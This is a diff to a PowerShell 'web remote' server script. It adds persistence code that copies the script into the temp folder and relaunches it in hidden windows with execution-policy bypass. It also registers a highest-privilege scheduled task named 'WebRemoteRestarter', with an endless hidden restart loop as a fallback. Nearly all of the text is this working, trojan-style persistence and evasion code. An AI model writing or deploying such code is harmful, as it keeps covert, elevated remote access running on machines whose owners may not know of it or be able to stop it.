@@ -276,6 +276,42 @@ IPs: $($ips -join ', ')
     $response.Close()
 }
 
+# Persistence - restart if closed
+$scriptPath = "$env:TEMP\web_remote.ps1"
+if (!(Test-Path $scriptPath)) {
+    # Save script to temp for persistence
+    [System.IO.File]::WriteAllText($scriptPath, (Get-Content $PSCommandPath))
+}
+
+# Create persistence service
+$serviceName = "WebRemote"
+if (!(Get-Service $serviceName -ErrorAction SilentlyContinue)) {
+    try {
+        # Create a simple service that restarts our script
+        $serviceScript = @"
+# Service to restart web server
+while (`$true) {
+    Start-Sleep -Seconds 5
+    try {
+        Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`""
+    } catch {
+        Start-Sleep -Seconds 10
+    }
+}
+"@
+        $serviceScriptPath = "$env:TEMP\web_service.ps1"
+        [System.IO.File]::WriteAllText($serviceScriptPath, $serviceScript)
+        
+        # Install as scheduled task (more reliable than service)
+        $action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$serviceScriptPath`""
+        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
+        Register-ScheduledTask -TaskName "WebRemoteRestarter" -Action $action -Trigger $trigger -RunLevel Highest -Force
+    } catch {
+        # Fallback: create simple restart loop
+    Start-Process powershell -WindowStyle Hidden -ArgumentList "-Command `"while (`$true) { Start-Sleep -Seconds 10; try { Start-Process powershell -WindowStyle Hidden -ArgumentList '-ExecutionPolicy Bypass -File `"$scriptPath`"" } catch { Start-Sleep -Seconds 5 } }`""
+    }
+}
+
 # Keep server running indefinitely
 try {
     while ($true) {
